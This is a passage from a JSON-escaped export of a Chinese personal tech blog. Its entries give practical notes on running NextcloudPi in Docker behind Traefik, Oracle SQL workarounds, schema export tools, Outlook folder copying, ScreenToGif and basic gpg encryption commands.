href=\"https://docs.google.com/presentation/d/1aZzPbmhYfa51MsoK4FskQPeoIL6AqMXVzW5eQRiTfhw/edit#slide=id.g426e3e8d8f_1_0\" target=\"_blank\" rel=\"noopener\">Promethues</a><br><a href=\"https://www.techrepublic.com/article/how-to-install-the-nextcloud-client-on-ubuntu/\" target=\"_blank\" rel=\"noopener\">Ubuntu 安裝教學</a></p>\n<h2 id=\"意外升級搞壞-2021-01-10\"><a href=\"#意外升級搞壞-2021-01-10\" class=\"headerlink\" title=\"意外升級搞壞(2021-01-10)\"></a>意外升級搞壞(2021-01-10)</h2><p>今天用<a href=\"https://scan.nextcloud.com/\" target=\"_blank\" rel=\"noopener\">Nextcloud Security Scan</a>掃我 nextcloud 弱點<br>發現版本稍微舊<br><a href=\"https://hub.docker.com/r/ownyourbits/nextcloudpi\" target=\"_blank\" rel=\"noopener\">ownyourbits/nextcloudpi - Docker Hub</a><br>想說 <code>docker pull ownyourbits/nextcloudpi</code> 這樣更新<br>重啟新的 container 就可以了<br>誰知道 MariaDB 不能用了</p>\n<p>不知道是不是之前版本是 MySQL 關係<br>於是我只能重啟重建之路</p>\n<p>先假設我有使用 traefik<br>所以我的 80 443 port 都被占用</p>\n<p>這次我採取使用 docker-compose 來做</p>\n<p><strong> 以下我用1.34.1 操作還是有問題</strong><br>有看到有人降到 1.31 就能正常使用<br>好像後面有大改版，畫面首頁有調整</p>\n<p>1.34.1<br><a href=\"https://help.nextcloud.com/t/docker-volume-does-not-contain-user-data/101808/25\" target=\"_blank\" rel=\"noopener\">Docker volume does not contain user data - ℹ️ Support / 📦 Appliances (Docker, Snappy, VM, NCP) - Nextcloud community</a><br>重點好像有bug，docker hub 好像沒這個版本<br>所以去 Git 上面抓下來編譯</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install jq</span><br><span class=\"line\"></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/nextcloud/nextcloudpi.git  <span class=\"comment\"># 預設就是 1.34.1</span></span><br><span class=\"line\">git checkout v1.31</span><br><span class=\"line\"><span class=\"built_in\">cd</span> nextcloudpi</span><br><span class=\"line\">./build-docker.sh armhf</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/nextcloud/nextcloudpi/blob/master/docker-compose-armhf.yml\" target=\"_blank\" rel=\"noopener\">nextcloudpi/docker-compose-armhf.yml at master · nextcloud/nextcloudpi · GitHub</a><br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"3\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  nextcloudpi:</span></span><br><span class=\"line\"><span class=\"comment\">#    image:  ownyourbits/nextcloudpi</span></span><br><span class=\"line\"><span class=\"comment\">#    後來發現 nextcloudpi 有 nextcloudpi-armhf image</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">ownyourbits/nextcloudpi-armhf</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"string\">\"192.168.1.x\"</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">        -</span> <span class=\"string\">traefik_network</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.backend=ncp\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.ncp.rule=Host(`xxxx.duckdns.org`)\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.ncp.tls=true\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.services.ncp.loadbalancer.server.port=80\"</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"1180:80\"</span> <span class=\"comment\"># 暫時使用，traefik 可以註解調</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"11443:443\"</span> <span class=\"comment\"># 暫時使用，traefik 可以註解調</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"4443:4443\"</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/media/USBdrive/ncp2:/data</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/etc/localtime:/etc/localtime:ro</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik_network:</span></span><br><span class=\"line\"><span class=\"attr\">    external:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<p>因為我用 Traefik 轉 https 關係<br>所以我要把 Force HTTPS 給關掉<br>nc-trust-domain 把 192.168.1.202 加進去</p>\n<p><a href=\"https://192.168.1.202:11443\" target=\"_blank\" rel=\"noopener\">https://192.168.1.202:11443</a> 就能用 ncp 進去<br>我通常會建立新的 admin 帳號給自己</p>\n<p>要把舊的檔案一進去</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose <span class=\"built_in\">exec</span> nextcloudpi bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /data/nextcloud/</span><br><span class=\"line\"></span><br><span class=\"line\">sudo -u www-data php occ files:scan --all</span><br></pre></td></tr></table></figure>\n<p><del>新版檔案路徑在 <code>/data-ro/nextcloud/data/xxuser/files</code></del> 1.43.1 bug??</p>\n<p>上傳大量檔案推薦使用 WinSCP 上傳<br>可以參考:<a href=\"https://harry-lin.blogspot.com/2019/05/winscp-sftpsudo.html\" target=\"_blank\" rel=\"noopener\">Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案</a><br>怎麼使用 winscp? 可以參考我這篇 <a href=\"https://malagege.github.io/blog/2020/01/10/WinSCP%20%E7%94%A8%20sudo%20%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E7%9A%84%E6%96%B9%E6%B3%95/\">WinSCP 用 sudo 上傳檔案的方法(含切換一般使用者) | 程式狂想筆記</a></p>\n<p><a href=\"https://192.168.1.x:4443/?app=nc-scan-auto\" target=\"_blank\" rel=\"noopener\">https://192.168.1.x:4443/?app=nc-scan-auto</a></p>\n<p>可以馬上執行</p>\n<p>通常60分會讀一次</p>\n<p>暫時收工</p>\n<p><strong>2021-05-10</strong></p>\n<p>還是不想透過用指令方法去實作<br>traefik 上傳多個 MP3 會有問題(可能樹梅派做這些動作 loading 還是太重了)<br>想透過 sftp 上傳 權限用 www-data<br>本來想掛個sftp<br>但我又不想用www-data為帳號<br><code></code><br>git clone </p>\n<p>cd sftp </p>\n<p>docker build . -t rpi-sftp</p>\n<p>docker run -p 2223:22 -d rpi-sftp miles:123456:33:33:upload -v<br><code>`</code></p>\n<p><a href=\"https://mileslin.github.io/2020/02/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-FTP-SFTP-%E7%92%B0%E5%A2%83/\" target=\"_blank\" rel=\"noopener\">[Docker] 使用 Docker 建置 FTP(SFTP) 環境 - Miles’s Journey</a></p>\n<p><a href=\"https://hrbhot.github.io/posts/nextcloud/\" target=\"_blank\" rel=\"noopener\">Nextcloud</a><br><a href=\"https://b1ue.me/archives/183\" target=\"_blank\" rel=\"noopener\">nextcloud ntfs权限问题及解决方法-β1ùe</a><br><a href=\"https://www.fanfpy.top/index.php/archives/68/\" target=\"_blank\" rel=\"noopener\">Docker安装nextcloud以及遇到的一下问题和优化方法 - 烦fpy</a></p>\n<p><a href=\"https://2formosa.blogspot.com/2020/10/change-group-on-UNIX-like-system.html\" target=\"_blank\" rel=\"noopener\">阿就操場啊~: 使用者在Linux, BSD切換群組</a></p>\n<p>我後來使用  <code>usermod -a -G www-data pi</code><br>這樣我就可以執接sftp放檔案進去<br>www-data也能刪檔案</p>\n<p><a href=\"https://docs.linuxserver.io/images/docker-nextcloud\" target=\"_blank\" rel=\"noopener\">linuxserver/nextcloud - LinuxServer.io</a></p>\n<p>改umask</p>\n<p><del><code>-e UMASK=022</code></del><br>沒效…，看來新建資料夾比較麻煩<br><a href=\"https://www.computernetworkingnotes.com/rhce-study-guide/how-to-change-default-umask-permission-in-linux.html\" target=\"_blank\" rel=\"noopener\">How to change Default Umask Permission in Linux</a></p>\n","categories":["Docker"],"tags":["docker","nas","nextcloud"]},{"title":"Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法","url":"/blog/2021/01/12/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/","content":"<p>最近維運有時有超過 500 筆資料<br>需要在 SQL 指令區查詢<br>但是把多千筆資料拆開也是很耗時<br><a href=\"https://malagege.github.io/blog/2018/04/20/%E4%BB%A5%E5%9B%BA%E5%AE%9A%E8%A1%8C%E6%95%B8%E5%88%87%E5%89%B2%E6%96%87%E5%AD%97%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/\">以固定行數切割文字檔案方法 | 程式狂想筆記</a><br>先前有研究這個方法，可以快速切分<br>但直接查詢全部還是最快</p>\n<a id=\"more\"></a>\n<h2 id=\"暫存表\"><a href=\"#暫存表\" class=\"headerlink\" title=\"暫存表\"></a>暫存表</h2><ul>\n<li><a href=\"https://tomkuo139.blogspot.com/2009/12/oracle-db-temporary-table.html\" target=\"_blank\" rel=\"noopener\">昭佑.天翔: Oracle DB 中, 建立 Temporary Table</a></li>\n<li><a href=\"https://roye0310.pixnet.net/blog/post/69218052\" target=\"_blank\" rel=\"noopener\">Oracle Temp Table 應用 @ Chuck Oracle Engineer :: 痞客邦 ::</a></li>\n</ul>\n<p>正式環境無法使用</p>\n<h2 id=\"神奇大法\"><a href=\"#神奇大法\" class=\"headerlink\" title=\"神奇大法\"></a>神奇大法</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">with t as </span><br><span class=\"line\">(</span><br><span class=\"line\">    <span class=\"keyword\">select</span> (<span class=\"keyword\">column_value</span>).getnumberval() Codes <span class=\"keyword\">from</span> <span class=\"keyword\">xmltable</span>(<span class=\"string\">'1,2,3,4,5'</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> t</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> (<span class=\"keyword\">SELECT</span> <span class=\"number\">1</span> <span class=\"keyword\">FROM</span> M_ITEMS M <span class=\"keyword\">WHERE</span> codes = M.ITEM_CODE);</span><br></pre></td></tr></table></figure>\n<p>和<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">with t as </span><br><span class=\"line\">(</span><br><span class=\"line\">    <span class=\"keyword\">select</span> (<span class=\"keyword\">column_value</span>).getstringval() Codes <span class=\"keyword\">from</span> <span class=\"keyword\">xmltable</span>(<span class=\"string\">'\"A\",\"B\",\"C\"'</span>)</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> t</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> (<span class=\"keyword\">SELECT</span> <span class=\"number\">1</span> <span class=\"keyword\">FROM</span> M_ITEMS M <span class=\"keyword\">WHERE</span> codes = M.ITEM_CODE);</span><br></pre></td></tr></table></figure></p>\n<p>主要重點是 <code>select (column_value).getnumberval() Codes from xmltable(&#39;1,2,3,4,5&#39;)</code></p>\n<p>參考: <a href=\"https://stackoverflow.com/questions/12169842/oracle-create-a-temporary-resultset-for-use-in-a-query\" target=\"_blank\" rel=\"noopener\">sql - Oracle- create a temporary resultset for use in a query - Stack Overflow</a></p>\n<p>2021-03-13</p>\n<h2 id=\"Oracle-IN-可放超過1000查詢條件方法\"><a href=\"#Oracle-IN-可放超過1000查詢條件方法\" class=\"headerlink\" title=\"Oracle IN 可放超過1000查詢條件方法\"></a>Oracle IN 可放超過1000查詢條件方法</h2><p>雖然要手動組</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">table</span> <span class=\"keyword\">where</span> (<span class=\"number\">1</span>,<span class=\"keyword\">ID</span>)  <span class=\"keyword\">in</span> ( (<span class=\"number\">1</span>,<span class=\"number\">0001</span>),(<span class=\"number\">1</span>,<span class=\"number\">0002</span>)... (<span class=\"number\">1</span>,<span class=\"number\">1999</span>) )</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://copsonliu.pixnet.net/blog/post/92688453-oracle-1000-in-clause-limit\" target=\"_blank\" rel=\"noopener\">oracle 1000 in clause limit @ 阿朗的部落格 :: 痞客邦 ::</a></p>\n","categories":["Oracle"],"tags":["oracle"]},{"title":"Oracle 匯出 Schema 好用工具","url":"/blog/2020/09/03/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/","content":"<p>最近公司專案需要建制某環境 Table Schema<br>但是現有工具沒辦法做到大量匯出Table<br>後來 Google 好用的工具</p>\n<a id=\"more\"></a>\n<h2 id=\"scheme2ddl\"><a href=\"#scheme2ddl\" class=\"headerlink\" title=\"scheme2ddl\"></a>scheme2ddl</h2><p><a href=\"https://github.com/qwazer/scheme2ddl\" target=\"_blank\" rel=\"noopener\">qwazer/scheme2ddl: Command line util for export oracle schema to set of ddl scripts</a></p>\n<p>java -jar scheme2ddl-2.4.3-SNAPSHOT.jar -url _DB_USERID_/_DB_PASSWORD_:@_Oracle_IP_:1521:<em>DBNAME</em> -o D:/temp/</p>\n<p>執行速度非常快!!</p>\n<h2 id=\"其他看到工具\"><a href=\"#其他看到工具\" class=\"headerlink\" title=\"其他看到工具\"></a>其他看到工具</h2><p>MySQL 就沒找了，現成 phpmyadmin 都可以做到</p>\n<p>不過，剛剛有發現看起來好用工具<a href=\"https://github.com/k0kubun/sqldef\" target=\"_blank\" rel=\"noopener\">k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL</a><br>之前有紀錄這些工具<a href=\"https://malagege.github.io/blog/2020/01/02/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/\">快速產生資料表 alter table 語法 schemalex | 程式狂想筆記</a></p>\n<p>DB2 剛好有看到<a href=\"https://github.com/qwazer/db2-scheme2ddl\" target=\"_blank\" rel=\"noopener\">qwazer/db2-scheme2ddl: Command line util for export IBM DB2 schema to set of ddl scripts</a><br>不過我就沒測試了</p>\n<p><a href=\"https://github.com/qwazer/db2-table2sql\" target=\"_blank\" rel=\"noopener\">qwazer/db2-table2sql</a></p>\n","categories":["Oracle"],"tags":["db2","oracle"]},{"title":"Oracle 時間運算 筆記","url":"/blog/2020/09/09/Oracle-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/","content":"<p>TODO: 之後有空來整理</p>\n<a id=\"more\"></a>\n<p>昨天</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AND oh.tran_date BETWEEN TRUNC(SYSDATE - 1) AND TRUNC(SYSDATE) - 1/86400</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/1574565/how-can-i-select-records-only-from-yesterday\" target=\"_blank\" rel=\"noopener\">sql - How can I select records ONLY from yesterday? - Stack Overflow</a></p>\n","categories":["Oracle"],"tags":["oracle"]},{"title":"Oracle 使用 listagg 多列群組合成同一列方法","url":"/blog/2020/12/24/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/","content":"<p>之前有在 MySQL 用過這個需求用過這個需求<a href=\"https://malagege.github.io/blog/2019/09/02/group-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95/\">GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法 | 程式狂想筆記</a><br>但是 Oracle 用上有差異<br>還多了一堆限制(如:字數不能超過 4000)<br>distinct 還會被禁用??!</p>\n<a id=\"more\"></a>\n<h2 id=\"Distinct\"><a href=\"#Distinct\" class=\"headerlink\" title=\"Distinct\"></a>Distinct</h2><ol>\n<li><a href=\"https://blog.csdn.net/Weixiaohuai/article/details/84998212\" target=\"_blank\" rel=\"noopener\">Oracle listagg去重distinct三種方法總結_weixiaohuai的博客-CSDN博客</a></li>\n<li><a href=\"https://community.oracle.com/tech/developers/discussion/2499711/remove-duplicates-from-comma-separated-string\" target=\"_blank\" rel=\"noopener\">Remove Duplicates From Comma Separated String — oracle-tech</a></li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 此方法需要排序後才有過濾重複效果</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> REGEXP_REPLACE(<span class=\"string\">'5,5,5,5,6,6,5,5,5,6,7,4,1,2,1,4,7,2'</span>, <span class=\"string\">'(^|,)([^,]*)(,\\2)+'</span>,<span class=\"string\">'\\1\\2'</span>) <span class=\"keyword\">from</span> dual;</span><br><span class=\"line\"><span class=\"comment\">---------------------------------</span></span><br><span class=\"line\">5,6,5,6,7,4,1,2,1,4,7,2</span><br></pre></td></tr></table></figure>\n<h2 id=\"字數過長\"><a href=\"#字數過長\" class=\"headerlink\" title=\"字數過長\"></a>字數過長</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL&gt; select rtrim(xmlagg(xmlelement(e,id,',').extract('//text()') order by id).GetClobVal(),',')</span><br><span class=\"line\">   from (<span class=\"keyword\">select</span> <span class=\"keyword\">level</span> <span class=\"keyword\">as</span> <span class=\"keyword\">id</span> <span class=\"keyword\">from</span> dual <span class=\"keyword\">connect</span> <span class=\"keyword\">by</span> <span class=\"keyword\">level</span> &lt; <span class=\"number\">1050</span>)</span><br><span class=\"line\">  /</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RTRIM</span>(<span class=\"keyword\">XMLAGG</span>(<span class=\"keyword\">XMLELEMENT</span>(E,<span class=\"keyword\">ID</span>,<span class=\"string\">','</span>).EXTRACT(<span class=\"string\">'//TEXT()'</span>)ORDERBYID).GETCLOBVAL(),<span class=\"string\">','</span></span><br><span class=\"line\"><span class=\"comment\">--------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">16</span>,<span class=\"number\">17</span>,<span class=\"number\">18.</span>..</span><br></pre></td></tr></table></figure>\n<ol>\n<li><a href=\"https://www.cnblogs.com/iupoint/p/10974864.html\" target=\"_blank\" rel=\"noopener\">ora-01489 字符串連接的結果過長 解決方案 - iUpoint - 博客園</a></li>\n<li><a href=\"https://lz5z.com/Oracle%20LISTAGG%E9%95%BF%E5%BA%A6%E5%A4%A7%E4%BA%8E4000%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">Oracle LISTAGG 長度大於 4000 解決方案 | lizhen’s blog</a></li>\n</ol>\n<p>但這個沒有排序…</p>\n<h2 id=\"逗號排序\"><a href=\"#逗號排序\" class=\"headerlink\" title=\"逗號排序\"></a>逗號排序</h2><p><a href=\"https://stackoverflow.com/questions/7808325/sort-delimited-separated-values-in-a-string-with-oracle-sql\" target=\"_blank\" rel=\"noopener\">Sort delimited separated values in a string with (Oracle) SQL - Stack Overflow</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">listagg</span>(somedata, <span class=\"string\">'|'</span>) <span class=\"keyword\">within</span> <span class=\"keyword\">group</span> (<span class=\"keyword\">order</span> <span class=\"keyword\">by</span> somedata) somedata <span class=\"keyword\">from</span> (</span><br><span class=\"line\"><span class=\"keyword\">with</span> q <span class=\"keyword\">as</span> (<span class=\"keyword\">select</span> <span class=\"string\">'|'</span>||<span class=\"string\">'9|2|6|7|5'</span> <span class=\"keyword\">as</span> somedata <span class=\"keyword\">from</span> dual)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">substr</span>(somedata, <span class=\"keyword\">instr</span>(somedata, <span class=\"string\">'|'</span>, <span class=\"number\">1</span>, <span class=\"keyword\">rownum</span>) + <span class=\"number\">1</span>, <span class=\"number\">1</span>) somedata</span><br><span class=\"line\">  <span class=\"keyword\">from</span> q,</span><br><span class=\"line\">   (<span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> q <span class=\"keyword\">connect</span> <span class=\"keyword\">by</span> <span class=\"keyword\">level</span> &lt;= <span class=\"keyword\">length</span>(regexp_replace(somedata, <span class=\"string\">'[0-9]'</span>, <span class=\"string\">''</span>)))</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>但這個跟 xmlagg 結合會有問題<br>都會跑出 null</p>\n<p>先記錄到這邊</p>\n","categories":["SQL"],"tags":["sql","oracle"]},{"title":"Oracle 空白字元 和 NULL","url":"/blog/2020/09/08/Oracle-%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-%E5%92%8C-NULL/","content":"<p>之前有聽說 Oracle 空白字元跟 NULL 會是一樣的<br>但沒搞清楚<br>今天果然踩到地雷了<br>趕快來釐清一下</p>\n<a id=\"more\"></a>\n<p>空白字元查 insert into 進去時候，Oracle 會轉成 NULL<br>所以查詢 select … where xxx is <strong>null</strong> 要放 null<br>空白字元查詢會找不到</p>\n<p><a href=\"https://www.cnblogs.com/memory4young/p/use-null-empty-space-in-oracle.html\" target=\"_blank\" rel=\"noopener\">Oracle中的NULL、’’（空字符串）以及’_’（空格） - Memory4Young - 博客园</a></p>\n","categories":["Oracle"],"tags":["oracle"]},{"title":"Outlook 複製資料夾匯出方法","url":"/blog/2019/08/29/Outlook-%E8%A4%87%E8%A3%BD%E8%B3%87%E6%96%99%E5%A4%BE%E5%8C%AF%E5%87%BA%E6%96%B9%E6%B3%95/","content":"<p>最近使用 Outlook 匯入一些規則<br>但相關規則會做搬移信件到其他資料夾<br>由於規則非常多，所以我需要建置一些資料夾<br>想說有什麼快速方法， Google 一下好用方法<br>來記錄一下非常快速方法</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>點擊「檔案」→「資訊」頁→「清理工具」，選擇「封存」，<br>選擇要複製的來源資料檔、目的資料檔路徑，<br>指定封存日期早於任何一封郵件的日期，<br>即可複製一個只有空資料夾的pst檔。<br>參考: <a href=\"http://cic-soon.blogspot.com/2013/01/outlook-outlook.html\" target=\"_blank\" rel=\"noopener\">[Outlook] 複製Outlook資料檔目錄結構</a></p>\n</blockquote>\n<p>我用 Outlook 2010 方式可以順利完成!!</p>\n<p><a href=\"https://www.extendoffice.com/zh-TW/documents/outlook/2385-outlook-copy-folder-structure-new-pst.html\" target=\"_blank\" rel=\"noopener\">如何將文件夾結構複製到Outlook中的新的PST數據文件？</a></p>\n","categories":["實用工具"],"tags":["outlook"]},{"title":"PC實用錄制成GIF工具 - ScreenToGif","url":"/blog/2018/08/05/PC%E5%AF%A6%E7%94%A8%E9%8C%84%E5%88%B6%E6%88%90GIF%E5%B7%A5%E5%85%B7-ScreenToGif/","content":"<p>最近從logdown轉道github這邊<br>沒有圖片限制的問題<br>覺得用點動態圖片會比較好說明<br>有專門找一下實用錄製GIF工具</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>.錄屏工具，Mac推薦用GIPHY的，windows系統推薦用Honeycam和Gifcam。<br><a href=\"https://www.zhihu.com/question/47403612\" target=\"_blank\" rel=\"noopener\">推薦好用的錄製屏幕成Gif的軟件？ - 知乎</a></p>\n</blockquote>\n<p>裡面我有用過Gifcam<br>不過我覺得沒有很好用</p>\n<p>ScreenToGif  功能非常多<br>不過我也只用最簡單錄製功能</p>\n<p>由於太好用了，我只需要紀錄<a href=\"https://www.zhihu.com/question/47403612\" target=\"_blank\" rel=\"noopener\">推薦好用的錄製屏幕成Gif的軟件？ - 知乎</a><br>之前那篇文章沒有寫ScreenToGif，我之前只是先記錄一下這邊能寫的套件<br>某天進入發現有ScreenToGif就抓下來使用，發現真的很好用<br>還是免安裝<br>有截圖的需要的人可以用用看</p>\n","categories":["實用工具"],"tags":["gif"]},{"title":"PGP 筆記","url":"/blog/2021/04/11/PGP-%E7%AD%86%E8%A8%98/","content":"<p>第一次使用 PGP加密筆記，原本看到 GPG 跟 Git 做簽章<br>想說GPG 跟 PGP 應該沒甚麼關係<br>但是後來爬文一下，GPG(GunPG)是產生和管理 PGP 金鑰軟體<br>看來有空順便來研究 GIT 簽章</p>\n<h2 id=\"測線上加密網站\"><a href=\"#測線上加密網站\" class=\"headerlink\" title=\"測線上加密網站\"></a>測線上加密網站</h2><p><a href=\"https://github.com/Gaff/pgp.help\" target=\"_blank\" rel=\"noopener\">https://github.com/Gaff/pgp.help</a><br><a href=\"https://pgp.help/#/\" target=\"_blank\" rel=\"noopener\">pgp.help - Modern javascript client-side PGP encryption and decryption tool</a></p>\n<p><a href=\"https://smartninja-pgp.appspot.com/\" target=\"_blank\" rel=\"noopener\">SmartNinja Online PGP</a></p>\n<p><a href=\"https://www.ilovefreesoftware.com/21/featured/online-pgp-encryption-websites-free-encrypt-email-text.html\" target=\"_blank\" rel=\"noopener\">5 Online PGP Encryption Websites Free to Encrypt Email, Text</a></p>\n<p><a href=\"https://pgptool.github.io/\" target=\"_blank\" rel=\"noopener\">PGPTool - use this tool to encrypt and decrypt PGP files. OpenPGP compatible</a></p>\n<h2 id=\"測試-pgp-加解密\"><a href=\"#測試-pgp-加解密\" class=\"headerlink\" title=\"測試 pgp 加解密\"></a>測試 pgp 加解密</h2><p>簡單來講，就次把private key 和 public key 匯入到 gpg<br>然後使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gpg --import &#123;private/public key&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># recipient指定接收者的公鑰ID</span></span><br><span class=\"line\">gpg --recipient &#123;keyid/uid&#125; --output encrypt.txt --encrypt input.txt</span><br><span class=\"line\"><span class=\"comment\"># 也可以按喜好加上--armor選項等</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 我更喜歡用 </span></span><br><span class=\"line\">gpg  -se  -o  encrypt.txt  -r  &#123;keyid/uid&#125;   input.txt  </span><br><span class=\"line\"><span class=\"comment\"># s代表簽名  e代表加密</span></span><br><span class=\"line\"><span class=\"comment\"># o是 將結果 輸出到檔案  encrypt.txt</span></span><br><span class=\"line\"><span class=\"comment\"># r後面跟 接收者的 uid或者 key id， 接收者的公鑰必須已經匯入過</span></span><br><span class=\"line\"><span class=\"comment\"># input.txt 是你要加密的檔案</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密：</span></span><br><span class=\"line\">gpg  --output decrypt.txt  --decrypt encrypt.txt </span><br><span class=\"line\"><span class=\"comment\"># 也可以</span></span><br><span class=\"line\">gpg -d encrypt.txt   <span class=\"comment\"># 輸出到終端 直接檢視</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.mdeditor.tw/pl/gW1n/zh-tw\" target=\"_blank\" rel=\"noopener\">2021年，用更現代的方法使用PGP（上）_UCloud雲端計算 - MdEditor</a><br>後來發現原始文章，放在下面</p>\n<p><a href=\"http://pre.tir.tw/008/blog/output/gnupg-gpg-jin-yao-guan-li.html\" target=\"_blank\" rel=\"noopener\">[GnuPG] gpg 金鑰管理 · Hello, World!</a></p>\n<p><a href=\"https://zhoubofsy.github.io/2017/05/18/security/gpg-usage/\" target=\"_blank\" rel=\"noopener\">GPG(GunPG)的使用 | Bolog</a></p>\n<p><a href=\"https://www.ecnetworker.com/2019/08/26/pgp%EF%BC%8Copenpgp%E5%92%8Cgnupg%E5%8A%A0%E5%AF%86%E4%B9%8B%E9%96%93%E7%9A%84%E5%8D%80%E5%88%A5/\" target=\"_blank\" rel=\"noopener\">PGP，OpenPGP和GnuPG加密之間的區別 – 易璽科技 ECNETWORKER</a></p>\n<h2 id=\"看起來實用工具\"><a href=\"#看起來實用工具\" class=\"headerlink\" title=\"看起來實用工具\"></a>看起來實用工具</h2><p><a href=\"https://www.secn.net/article/107917.html\" target=\"_blank\" 